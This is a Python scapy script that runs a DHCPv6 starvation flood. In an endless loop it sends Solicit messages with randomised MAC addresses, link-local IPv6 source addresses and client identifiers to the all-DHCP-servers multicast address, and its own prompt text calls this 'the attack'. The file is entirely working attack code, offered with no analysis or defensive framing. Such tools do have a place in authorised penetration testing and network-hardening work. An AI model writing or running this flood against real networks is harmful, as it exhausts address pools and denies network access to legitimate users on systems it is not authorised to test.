#!/usr/bin/python
import random
from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6OptElapsedTime, DHCP6OptClientId, DUID_LLT, DHCP6OptIA_NA
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp


def flood_DHCPv6():
    interface = input(" - Insert the interface, if you skip this by Enter, the packet is automatically "
                      "sent on every active interface: ")
    # Generate packet
    print("Flooding all active DHCP servers with DHCPv6 Solicit messages (press Ctrl C to stop the attack)")
    while True:
        try:
            random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            layer2 = Ether(dst="33:33:00:01:00:02", src=random_mac, type=34525)

            M = 16 ** 4
            random_IP = "fe80::dead:" + ":".join(("%x" % random.randint(0, M)
                                                  for j in range(4)))
            layer3 = IPv6(dst="ff02::1:2", src=random_IP, hlim=1)

            layer4 = UDP(sport=546, dport=547)

            dhcpv6_solicit = DHCP6_Solicit(trid=random.randint(34525, 1710850))
            dhcpv6_OptElapsedTime = DHCP6OptElapsedTime()
            dhcpv6_OptClientId = DHCP6OptClientId(duid=
                                                  DUID_LLT(timeval=random.randint(1027257600, 3327257600),
                                                           lladdr=random_mac))
            dhcpv6_OptIANA = DHCP6OptIA_NA(iaid=random.randint(123456789, 1735608832))

            packet1 = layer2 / layer3 / layer4 / dhcpv6_solicit / \
                      dhcpv6_OptElapsedTime / dhcpv6_OptClientId / dhcpv6_OptIANA
            if interface =="":
                sendp(packet1, verbose=False)
            else:
                sendp(packet1, verbose=False, iface=interface)
        except KeyboardInterrupt:
            break
